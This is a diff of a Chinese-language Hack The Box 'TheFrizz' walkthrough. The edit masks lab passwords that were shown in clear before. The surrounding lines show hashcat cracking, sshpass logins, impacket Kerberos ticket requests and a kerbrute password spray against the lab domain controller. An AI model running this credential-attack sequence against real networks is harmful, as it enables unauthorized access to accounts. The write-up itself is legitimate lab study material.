@@ -348,10 +348,10 @@ gibbonPersonID  title   surname firstName       preferredName   officialName    
 └─$ hashcat -m 1420 -a 0 TheFrizz_gibbon.hash /usr/share/wordlists/rockyou.txt --force -O
 hashcat (v6.2.6) starting
 ...
-067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
+067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni******Magic23
 
 ```
-> `f.frizzle`:`Jenni_Luvs_Magic23`
+> `f.frizzle`:`Jenni******Magic23`
 
 1. 嘗試登入 Gibbon http://frizzdc.frizz.htb/Gibbon-LMS/ 
 ![image](https://hackmd.io/_uploads/ryLmJ4P-xl.png)
@@ -365,7 +365,7 @@ hashcat (v6.2.6) starting
 f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
 
 ┌──(chw㉿CHW)-[~]
-└─$ sshpass -p 'Jenni_Luvs_Magic23' ssh -o PreferredAuthentications=password f.frizzle@10.10.11.60
+└─$ sshpass -p 'Jenni******Magic23' ssh -o PreferredAuthentications=password f.frizzle@10.10.11.60
 
 f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
 ```
@@ -379,7 +379,7 @@ f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
 CLOCK: time stepped by 25201.312121
 
 ┌──(chw㉿CHW)-[~]
-└─$ impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60                              
+└─$ impacket-getTGT frizz.htb/'f.frizzle':'Jenni******Magic23' -dc-ip 10.10.11.60                              
 Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 
 
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
@@ -408,7 +408,7 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 CLOCK: time stepped by 484.270476
                                                         
 ┌──(root㉿CHW)-[/home/chw]
-└─# impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip 10.10.11.60 
+└─# impacket-getTGT frizz.htb/f.frizzle:Jenni******Magic23 -dc-ip 10.10.11.60 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in f.frizzle.ccache
@@ -426,7 +426,7 @@ No entries found!
 ### 8. SSH
 ```
 ┌──(root㉿CHW)-[/home/chw]
-└─# impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip 10.10.11.60
+└─# impacket-getTGT frizz.htb/f.frizzle:Jenni******Magic23 -dc-ip 10.10.11.60
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -610,7 +610,7 @@ $client.Close()
 ```
 ![image](https://hackmd.io/_uploads/BJkFKGQXee.png)
 > 在 `conf/waptserver.ini` 中找到 wapt_password
-> (Base64 decode): `!suBcig@MehTed!R`
+> (Base64 decode): `!suBcig@******!R`
 
 接著尋找 PWD 對應的 User
 
@@ -647,7 +647,7 @@ g.frizzle
 ...
 
 ┌──(chw㉿CHW)-[~]
-└─$ kerbrute passwordspray -d frizz.htb --dc 10.10.11.60 \TheFrizz_user.txt '!suBcig@MehTed!R'
+└─$ kerbrute passwordspray -d frizz.htb --dc 10.10.11.60 \TheFrizz_user.txt '!suBcig@******!R'
 
 
     __             __               __     
@@ -661,16 +661,16 @@ Version: dev (n/a) - 06/08/25 - Ronnie Flathers @ropnop
 2025/06/08 17:30:57 >  Using KDC(s):
 2025/06/08 17:30:57 >   10.10.11.60:88
 
-2025/06/08 17:31:01 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@MehTed!R
+2025/06/08 17:31:01 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@******!R
 2025/06/08 17:31:01 >  Done! Tested 21 logins (1 successes) in 3.739 seconds
 ```
-> `M.SchoolBus@frizz.htb`:`!suBcig@MehTed!R`
+> `M.SchoolBus@frizz.htb`:`!suBcig@******!R`
 
 #### 11.1 確認 M.SchoolBus 可執行
 
 ```
 ┌──(chw㉿CHW)-[~]
-└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
+└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@******!R' -dc-ip 10.10.11.60
 
 Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 
 
@@ -759,7 +759,7 @@ Order       : 3
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
 └─$ sudo ntpdate -u 10.10.11.60                                        
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
+└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@******!R' -dc-ip 10.10.11.60
 ...
 [*] Saving ticket in M.SchoolBus.ccache                                                        
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
